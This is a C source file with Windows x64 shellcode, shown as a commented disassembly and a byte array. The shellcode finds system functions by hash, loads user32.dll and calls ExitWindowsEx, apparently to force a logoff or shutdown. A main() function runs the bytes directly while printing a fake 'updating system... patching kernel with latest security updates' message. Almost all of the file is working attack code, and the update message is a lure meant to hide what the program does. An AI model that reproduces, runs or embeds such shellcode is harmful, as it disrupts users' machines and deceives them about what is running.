#include<stdio.h>
#include<string.h>

/*
Windows x64 Shellcode via ExitWindowsEx 
Tested on : Windows 7 Ultimate x64 
Date : Nov 26, 2017 
Coded By : Chaitanya Haritash [@bofheaded] 
Special Thanks : Topher Timzen & Osanda Malith Jayathissa

  401000:       48 83 ec 28             sub    $0x28,%rsp
  401004:       48 83 e4 f0             and    $0xfffffffffffffff0,%rsp
  401008:       65 4c 8b 24 25 60 00    mov    %gs:0x60,%r12
  40100f:       00 00
  401011:       4d 8b 64 24 18          mov    0x18(%r12),%r12
  401016:       4d 8b 64 24 20          mov    0x20(%r12),%r12
  40101b:       4d 8b 24 24             mov    (%r12),%r12
  40101f:       4d 8b 7c 24 20          mov    0x20(%r12),%r15
  401024:       4d 8b 24 24             mov    (%r12),%r12
  401028:       4d 8b 64 24 20          mov    0x20(%r12),%r12
  40102d:       ba 8e 4e 0e ec          mov    $0xec0e4e8e,%edx
  401032:       4c 89 e1                mov    %r12,%rcx
  401035:       e8 54 00 00 00          callq  0x40108e
  40103a:       eb 34                   jmp    0x401070
  40103c:       59                      pop    %rcx
  40103d:       ff d0                   callq  *%rax
  40103f:       ba f5 be da 89          mov    $0x89dabef5,%edx
  401044:       48 89 c1                mov    %rax,%rcx
  401047:       e8 42 00 00 00          callq  0x40108e
  40104c:       48 89 c3                mov    %rax,%rbx
  40104f:       4d 31 c9                xor    %r9,%r9
  401052:       eb 33                   jmp    0x401087
  401054:       41 58                   pop    %r8
  401056:       eb 28                   jmp    0x401080
  401058:       5a                      pop    %rdx
  401059:       48 31 c9                xor    %rcx,%rcx
  40105c:       ff d3                   callq  *%rbx
  40105e:       ba 70 cd 3f 2d          mov    $0x2d3fcd70,%edx
  401063:       4c 89 f9                mov    %r15,%rcx
  401066:       e8 23 00 00 00          callq  0x40108e
  40106b:       48 31 c9                xor    %rcx,%rcx
  40106e:       ff d0                   callq  *%rax
  401070:       e8 c7 ff ff ff          callq  0x40103c
  401075:       75 73                   jne    0x4010ea
  401077:       65 72 33                gs jb  0x4010ad
  40107a:       32 2e                   xor    (%rsi),%ch
  40107c:       64 6c                   fs insb (%dx),%es:(%rdi)
  40107e:       6c                      insb   (%dx),%es:(%rdi)
  40107f:       00 e8                   add    %ch,%al
  401081:       d3 ff                   sar    %cl,%edi
  401083:       ff                      (bad)
  401084:       ff 30                   pushq  (%rax)
  401086:       00 e8                   add    %ch,%al
  401088:       c8 ff ff ff             enterq $0xffff,$0xff
  40108c:       30 00                   xor    %al,(%rax)
  40108e:       49 89 cd                mov    %rcx,%r13
  401091:       67 41 8b 45 3c          mov    0x3c(%r13d),%eax
  401096:       67 45 8b b4 05 88 00    mov    0x88(%r13d,%eax,1),%r14d
  40109d:       00 00
  40109f:       45 01 ee                add    %r13d,%r14d
  4010a2:       67 45 8b 56 18          mov    0x18(%r14d),%r10d
  4010a7:       67 41 8b 5e 20          mov    0x20(%r14d),%ebx
  4010ac:       44 01 eb                add    %r13d,%ebx
  4010af:       67 e3 3f                jecxz  0x4010f1
  4010b2:       41 ff ca                dec    %r10d
  4010b5:       67 42 8b 34 93          mov    (%ebx,%r10d,4),%esi
  4010ba:       44 01 ee                add    %r13d,%esi
  4010bd:       31 ff                   xor    %edi,%edi
  4010bf:       31 c0                   xor    %eax,%eax
  4010c1:       fc                      cld
  4010c2:       ac                      lods   %ds:(%rsi),%al
  4010c3:       84 c0                   test   %al,%al
  4010c5:       74 07                   je     0x4010ce
  4010c7:       c1 cf 0d                ror    $0xd,%edi
  4010ca:       01 c7                   add    %eax,%edi
  4010cc:       eb f4                   jmp    0x4010c2
  4010ce:       39 d7                   cmp    %edx,%edi
  4010d0:       75 dd                   jne    0x4010af
  4010d2:       67 41 8b 5e 24          mov    0x24(%r14d),%ebx
  4010d7:       44 01 eb                add    %r13d,%ebx
  4010da:       31 c9                   xor    %ecx,%ecx
  4010dc:       66 67 42 8b 0c 53       mov    (%ebx,%r10d,2),%cx
  4010e2:       67 41 8b 5e 1c          mov    0x1c(%r14d),%ebx
  4010e7:       44 01 eb                add    %r13d,%ebx
  4010ea:       67 8b 04 8b             mov    (%ebx,%ecx,4),%eax
  4010ee:       44 01 e8                add    %r13d,%eax
  4010f1:       c3                      retq
*/

unsigned char buf[] =
"\x48\x83\xec\x28\x48\x83\xe4\xf0\x65\x4c\x8b\x24\x25\x60\x00\x00\x00\x4d\x8b\x64\x24\x18\x4d\x8b\x64\x24\x20\x4d\x8b\x24\x24\x4d\x8b\x7c\x24"
"\x20\x4d\x8b\x24\x24\x4d\x8b\x64\x24\x20\xba\x8e\x4e\x0e\xec\x4c\x89\xe1\xe8\x54\x00\x00\x00\xeb\x34\x59\xff\xd0\xba\xf5\xbe\xda\x89\x48\x89"
"\xc1\xe8\x42\x00\x00\x00\x48\x89\xc3\x4d\x31\xc9\xeb\x33\x41\x58\xeb\x28\x5a\x48\x31\xc9\xff\xd3\xba\x70\xcd\x3f\x2d\x4c\x89\xf9\xe8\x23\x00"
"\x00\x00\x48\x31\xc9\xff\xd0\xe8\xc7\xff\xff\xff\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\xe8\xd3\xff\xff\xff\x30\x00\xe8\xc8\xff\xff\xff"
"\x30\x00\x49\x89\xcd\x67\x41\x8b\x45\x3c\x67\x45\x8b\xb4\x05\x88\x00\x00\x00\x45\x01\xee\x67\x45\x8b\x56\x18\x67\x41\x8b\x5e\x20\x44\x01\xeb"
"\x67\xe3\x3f\x41\xff\xca\x67\x42\x8b\x34\x93\x44\x01\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x39\xd7\x75\xdd"
"\x67\x41\x8b\x5e\x24\x44\x01\xeb\x31\xc9\x66\x67\x42\x8b\x0c\x53\x67\x41\x8b\x5e\x1c\x44\x01\xeb\x67\x8b\x04\x8b\x44\x01\xe8\xc3";

// Push into memory
int main()
{
   printf("\nPlease Wait, updating system...\nPatching kernel with latest security updates.", strlen(buf));
   void (*ret)() = (void(*)())buf;
   ret();
}
